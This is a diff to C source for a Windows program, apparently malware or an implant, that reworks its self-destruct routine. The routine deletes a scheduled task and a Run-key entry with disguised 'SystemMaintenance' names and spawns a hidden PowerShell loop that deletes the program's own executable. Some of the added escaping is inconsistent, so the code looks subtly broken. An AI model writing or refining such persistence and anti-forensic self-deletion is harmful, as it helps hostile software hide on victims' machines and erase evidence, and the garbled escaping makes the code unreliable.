@@ -2522,15 +2522,14 @@ BOOL FileExistsA(const char* filePath) {
     return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
 }
 
-
 // selfdestruct.c
 void selfDestruct() {
-    printf("[*] Initiating self-destruct...\n");
+    printf("[*] Initiating self-destruct...\\n");
     fflush(stdout);
     
     char exePath[MAX_PATH];
     if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
-        printf("[-] Failed to get executable path\n");
+        printf("[-] Failed to get executable path\\n");
         return;
     }
     
@@ -2546,12 +2545,19 @@ void selfDestruct() {
     // Eliminar tarea programada
     system("schtasks /delete /tn \\"SystemMaintenanceTask\\" /f > nul 2>&1");
     
-    // Crear proceso separado para eliminar el archivo después
+    // Preparar comando PowerShell robusto, ESCAPADO PARA BASH
     char cmd[2048];
     snprintf(cmd, sizeof(cmd),
-        "cmd.exe /c timeout /t 2 > nul & "
-        "del /f /q \\"%s\\" > nul 2>&1 & "
-        "reg delete \\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /v \\"SystemMaintenance\\" /f > nul 2>&1",
+        "cmd.exe /c "
+        "timeout /t 3 > nul & "
+        "powershell -Command \""
+            "\$ErrorActionPreference='SilentlyContinue'; "
+            "for(\$i=0; \$i -lt 5; \$i++){ "
+                "Start-Sleep -Seconds 2; "
+                "try{ Remove-Item -Force -Path '%s' -ErrorAction Stop; exit } catch{} "
+            "}; "
+            "Remove-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'SystemMaintenance' -ErrorAction SilentlyContinue"
+        "\" > nul 2>&1",
         exePath);
     
     STARTUPINFOA si = {0};
@@ -2563,12 +2569,15 @@ void selfDestruct() {
                       NULL, NULL, &si, &pi)) {
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
+    } else {
+        printf("[-] Failed to spawn cleanup process\n");
     }
     
-    printf("[+] Self-destruct initiated\n");
+    printf("[+] Self-destruct sequence activated. Exiting now...\n");
+    fflush(stdout);
+    
     ExitProcess(0);
 }
-
 
 char* stristr(const char* str, const char* pattern) {
     if (!str || !pattern) return NULL;
